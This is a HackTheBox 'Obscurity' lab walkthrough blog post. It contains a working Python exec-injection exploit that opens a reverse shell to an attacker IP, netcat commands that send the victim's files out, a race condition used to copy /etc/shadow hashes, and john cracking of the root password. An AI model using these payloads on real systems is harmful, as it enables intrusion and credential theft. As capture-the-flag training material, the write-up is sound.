---
layout: post
title:  Obscurity
categories: hackthebox
tags: [hackthebox, linux, medium, webserver, bugs]
---

![Obscurity](../../../../assets/images/hackthebox/obscurity/obscurity.png)

## abstract

Security by obscurity. This is the motto of this medium rated box by <script src="https://www.hackthebox.eu/badge/83743"></script>

In this box we find a self-written _SuperSecure_-webserver, a self-written _SuperSecure_-crypt algorithm and a _Better_-SSH implementation.

## recon

### nmap

As always a nmap scan.

```bash
# Nmap 7.80 scan initiated Sun Mar  8 07:32:57 2020 as: nmap -sC -sT -sV -o init.nmap obscurity.htb
Nmap scan report for obscurity.htb (10.10.10.168)
Host is up (0.033s latency).
Not shown: 996 filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
80/tcp   closed http
8080/tcp open   http-proxy BadHTTPServer
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sun, 08 Mar 2020 11:34:06
|     Server: BadHTTPServer
|     Last-Modified: Sun, 08 Mar 2020 11:34:06
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>0bscura</title>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="keywords" content="">
|     <meta name="description" content="">
|     <!-- 
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     <!-- stylesheet css -->
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/templatemo-blue.css">
|     </head>
|     <body data-spy="scroll" data-target=".navbar-collapse">
|     <!-- preloader section -->
|     <!--
|     <div class="preloader">
|_    <div class="sk-spinner sk-spinner-wordpress">
|_http-server-header: BadHTTPServer
|_http-title: 0bscura
9000/tcp closed cslistener
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.80%I=7%D=3/8%Time=5E64D7F5%P=x86_64-pc-linux-gnu%r(Get
SF:Request,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20Sun,\x2008\x20Mar\x20202
SF:0\x2011:34:06\nServer:\x20BadHTTPServer\nLast-Modified:\x20Sun,\x2008\x
SF:20Mar\x202020\x2011:34:06\nContent-Length:\x204171\nContent-Type:\x20te
SF:xt/html\nConnection:\x20Closed\n\n<!DOCTYPE\x20html>\n<html\x20lang=\"e
SF:n\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<title>0bscura</title>\n
SF:\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=Edge\">\n\t<m
SF:eta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sc
SF:ale=1\">\n\t<meta\x20name=\"keywords\"\x20content=\"\">\n\t<meta\x20nam
SF:e=\"description\"\x20content=\"\">\n<!--\x20\nEasy\x20Profile\x20Templa
SF:te\nhttp://www\.templatemo\.com/tm-467-easy-profile\n-->\n\t<!--\x20sty
SF:lesheet\x20css\x20-->\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/boot
SF:strap\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/font-aw
SF:esome\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/templat
SF:emo-blue\.css\">\n</head>\n<body\x20data-spy=\"scroll\"\x20data-target=
SF:\"\.navbar-collapse\">\n\n<!--\x20preloader\x20section\x20-->\n<!--\n<d
SF:iv\x20class=\"preloader\">\n\t<div\x20class=\"sk-spinner\x20sk-spinner-
SF:wordpress\">\n")%r(HTTPOptions,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20S
SF:un,\x2008\x20Mar\x202020\x2011:34:06\nServer:\x20BadHTTPServer\nLast-Mo
SF:dified:\x20Sun,\x2008\x20Mar\x202020\x2011:34:06\nContent-Length:\x2041
SF:71\nContent-Type:\x20text/html\nConnection:\x20Closed\n\n<!DOCTYPE\x20h
SF:tml>\n<html\x20lang=\"en\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<
SF:title>0bscura</title>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20con
SF:tent=\"IE=Edge\">\n\t<meta\x20name=\"viewport\"\x20content=\"width=devi
SF:ce-width,\x20initial-scale=1\">\n\t<meta\x20name=\"keywords\"\x20conten
SF:t=\"\">\n\t<meta\x20name=\"description\"\x20content=\"\">\n<!--\x20\nEa
SF:sy\x20Profile\x20Template\nhttp://www\.templatemo\.com/tm-467-easy-prof
SF:ile\n-->\n\t<!--\x20stylesheet\x20css\x20-->\n\t<link\x20rel=\"styleshe
SF:et\"\x20href=\"css/bootstrap\.min\.css\">\n\t<link\x20rel=\"stylesheet\
SF:"\x20href=\"css/font-awesome\.min\.css\">\n\t<link\x20rel=\"stylesheet\
SF:"\x20href=\"css/templatemo-blue\.css\">\n</head>\n<body\x20data-spy=\"s
SF:croll\"\x20data-target=\"\.navbar-collapse\">\n\n<!--\x20preloader\x20s
SF:ection\x20-->\n<!--\n<div\x20class=\"preloader\">\n\t<div\x20class=\"sk
SF:-spinner\x20sk-spinner-wordpress\">\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Mar  8 07:33:13 2020 -- 1 IP address (1 host up) scanned in 15.28 seconds
```

### first look
Port 80 is closed, so let's take a look on port 8080.

![Obscurity on port 8080](../../../../assets/images/hackthebox/obscurity/0_obscurity_8080.png)

There is an unrecognized webserver with the information, that the source code is available under the secret development directory.

### gobuster

My first try is to use gobuster.

![gobuster on port 8080](../../../../assets/images/hackthebox/obscurity/0_1_obscurity_gobuster.png)

Gobuster can't work with the received answer, so I tried some things unsuccessfully and went over to ffuf.


### ffuf

On the website is a message to server devs: the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory

So I try to fuzz the directory with the filename instead of the plain directory.

```bash
kali@kali:~/Downloads/ffuf_1.0.2_linux_amd64$ ./ffuf -c -w /usr/share/wordlists/wfuzz/general/big.txt -u http://obscurity.htb:8080/FUZZ/SuperSecureServer.py

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://obscurity.htb:8080/FUZZ/SuperSecureServer.py
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

develop                 [Status: 200, Size: 5892, Words: 1806, Lines: 171]
:: Progress: [3024/3024] :: Job [1/1] :: 756 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

The secret development directory is called develop, normally it should be easy to guess but the call of http://obscurity.htb:8080/develop/ we get a 404 instead of a 403 like normally.

## foothold

The SuperSecureServer is written in python and a comment give us a nudge where we should look at for an exploit.

```python
def serveDoc(self, path, docRoot):
    path = urllib.parse.unquote(path)
    try:
        info = "output = 'Document: {}'" # Keep the output for later debug
        exec(info.format(path)) # This is how you do string formatting, right?
        cwd = os.path.dirname(os.path.realpath(__file__))
        docRoot = os.path.join(cwd, docRoot)
        if path == "/":
            path = "/index.html"
        requested = os.path.join(docRoot, path[1:])
        if os.path.isfile(requested):
            mime = mimetypes.guess_type(requested)
            mime = (mime if mime[0] != None else "text/html")
            mime = MIMES[requested.split(".")[-1]]
            try:
                with open(requested, "r") as f:
                    data = f.read()
            except:
                with open(requested, "rb") as f:
                    data = f.read()
            status = "200"
        else:
            errorPage = os.path.join(docRoot, "errors", "404.html")
            mime = "text/html"
            with open(errorPage, "r") as f:
                data = f.read().format(path)
            status = "404"
    except Exception as e:
        print(e)
        errorPage = os.path.join(docRoot, "errors", "500.html")
        mime = "text/html"
        with open(errorPage, "r") as f:
            data = f.read()
        status = "500"
    return {"body": data, "mime": mime, "status": status}
```

### exploit

The _exec_ command is the vulnerable code command, I tried a lot to exploit it and in the end it was only the linebreak that separated me from a functional reverse shell.

```python
#!/usr/bin/python
import requests 
import urllib 
server = 'http://10.10.10.168:8080/' 
uri = '1337\'' + '\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.28",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])\na=\''
payload = urllib.parse.quote(uri) 
print("payload") 
print(server + payload) 
r = requests.get(server + payload) 
print(r.headers) 
print(r.text)
```

![exploit on obscurity](../../../../assets/images/hackthebox/obscurity/1_obscurity_exploit.png)

Ok, a low-priv shell. Time to move on into the home directory.

## user

```bash
www-data@obscure:/home/robert$ ls -la
ls -la
total 60
drwxr-xr-x 7 robert robert 4096 Dec  2 09:53 .
drwxr-xr-x 3 root   root   4096 Sep 24  2019 ..
lrwxrwxrwx 1 robert robert    9 Sep 28  2019 .bash_history -> /dev/null
-rw-r--r-- 1 robert robert  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 robert robert 3771 Apr  4  2018 .bashrc
drwxr-xr-x 2 root   root   4096 Dec  2 09:47 BetterSSH
drwx------ 2 robert robert 4096 Oct  3  2019 .cache
-rw-rw-r-- 1 robert robert   94 Sep 26  2019 check.txt
drwxr-x--- 3 robert robert 4096 Dec  2 09:53 .config
drwx------ 3 robert robert 4096 Oct  3  2019 .gnupg
drwxrwxr-x 3 robert robert 4096 Oct  3  2019 .local
-rw-rw-r-- 1 robert robert  185 Oct  4  2019 out.txt
-rw-rw-r-- 1 robert robert   27 Oct  4  2019 passwordreminder.txt
-rw-r--r-- 1 robert robert  807 Apr  4  2018 .profile
-rwxrwxr-x 1 robert robert 2514 Oct  4  2019 SuperSecureCrypt.py
-rwx------ 1 robert robert   33 Sep 25  2019 user.txt
```

The user robert encrypted his passwordreminder.txt with the SuperSecureCrypt.py script and a unknown password.

So I need to experiment a bit with these files in the directory, but with a low-priv shell it's a pain in the ...; :)

But this is a nice situation to transfer files via netcat, so I downloaded all necessary files from the server to my local machine.

### file transfer via nc
For my work I need SuperSecureCrypt.py, out.txt, passwordreminder.txt and check.txt

On my machine
```bash
kali@kali:~$ nc -lp 1338 -q 1 > SuperSecureCrypt.py < /dev/null
kali@kali:~$ nc -lp 1338 -q 1 > out.txt < /dev/null
kali@kali:~$ nc -lp 1338 -q 1 > passwordreminder.txt < /dev/null
kali@kali:~$ nc -lp 1338 -q 1 > check.txt < /dev/null
```

On obscurity.htb
```bash
www-data@obscure:/home/robert$ cat SuperSecureCrypt.py | nc 10.10.14.14 1338
cat SuperSecureCrypt.py | nc 10.10.14.14 1338
www-data@obscure:/home/robert$ cat out.txt | nc 10.10.14.14 1338
cat out.txt | nc 10.10.14.14 1338
www-data@obscure:/home/robert$ cat passwordreminder.txt | nc 10.10.14.14 1338
cat passwordreminder.txt | nc 10.10.14.14 1338
www-data@obscure:/home/robert$ cat check.txt | nc 10.10.14.14 1338
cat check.txt | nc 10.10.14.14 1338
```

### SuperSecureCrypt

```bash
kali@kali:~$ python SuperSecureCrypt.py -h
usage: SuperSecureCrypt.py [-h] [-i InFile] [-o OutFile] [-k Key] [-d]

Encrypt with 0bscura's encryption algorithm

optional arguments:
  -h, --help  show this help message and exit
  -i InFile   The file to read
  -o OutFile  Where to output the encrypted/decrypted file
  -k Key      Key to use
  -d          Decrypt mode
```

Let's take a look at the encryption function.

```python
def encrypt(text, key):
    keylen = len(key)
    keyPos = 0
    encrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr + ord(keyChr)) % 255)
        encrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return encrypted

def decrypt(text, key):
    keylen = len(key)
    keyPos = 0
    decrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr - ord(keyChr)) % 255)
        decrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return decrypted
```

Encryption is symmetric and every character is simply replaced, so it's possible to simply brute-force and I wrote the following script:

#### Brute-Force

```python
# read plaintext check.txt
with open('check.txt', 'r', encoding='UTF-8') as f:
  check = f.read()

key=''
# read encrypted out.txt
with open('out.txt', 'r', encoding='UTF-8') as f:
  out = f.read()
  # for every encrypted char 
  for idx_out in range(len(out)):
    # try every char in the range 
    for i in range(255):
      char = chr((ord(out[idx_out]) - i) % 255)
      # if the char matched we found a valid character from the key
      if char == check[idx_out]:
        key += chr(i)
        break
  print(key)
```

It's not pretty, but it works. 

After I received the password, I tried to decrypt the passwordreminder.txt successfully and received the password (SecThruObsFTW) from robert.

```bash
kali@kali:~$ python3 test.py 
alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal
kali@kali:~$ python3 SuperSecureCrypt.py -i passwordreminder.txt -o pass.txt -k alexandrovich -d
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file passwordreminder.txt...
Decrypting...
Writing to pass.txt...
kali@kali:~$ cat pass.txt
SecThruObsFTW

kali@kali:~$ ssh robert@obscurity.htb
robert@obscurity.htb's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu May  7 18:14:42 UTC 2020

  System load:  0.0               Processes:             105
  Usage of /:   45.9% of 9.78GB   Users logged in:       0
  Memory usage: 11%               IP address for ens160: 10.10.10.168
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

40 packages can be updated.
0 updates are security updates.


Last login: Mon Dec  2 10:23:36 2019 from 10.10.14.4
robert@obscure:~$ wc user.txt 
 1  1 33 user.txt
```

## privesc

### enumeration

On this box we don't need the well-known scripts for enumeration, a simple _sudo -l_ does the job.

```bash
robert@obscure:~/BetterSSH$ sudo -l
Matching Defaults entries for robert on obscure:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on obscure:
    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
```

A self-written SSH service, that could be interesting, this script seems to work but it has one vulnerability.
It copies the _/etc/shadow_ file to a non existing SSH directory under /tmp and compare the user input with the hash.

If we are faster than the remove command maybe we could steal this file.

### BetterSSH

First Terminal:
```bash
robert@obscure:~$ cd /tmp
robert@obscure:/tmp$ mkdir SSH && cd SSH
robert@obscure:/tmp/SSH$ while true; do cp * ../; done
```

Second terminal:
```bash
sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: root
Enter password: test
Incorrect pass
```

Got it.
```bash
robert@obscure:/tmp$ cat z0o2ogfM 
root
$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
18226
0
99999
7

robert
$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/
18163
0
99999
7
```

The hashes are looking well-known. Maybe john can crack it.

### from john to root
```bash
kali@kali:~$ sudo john --format=sha512crypt -w /usr/share/wordlists/rockyou.txt pw.hash 
Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mercedes         (?)
1g 0:00:00:00 DONE (2020-05-07 14:55) 5.000g/s 5120p/s 5120c/s 5120C/s crystal..random
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

mercedes is the password of root but a login over ssh is not possible.

su as robert
```bash
robert@obscure:/tmp$ su
Password: 
root@obscure:/tmp# wc /root/root.txt 
 1  1 33 /root/root.txt
```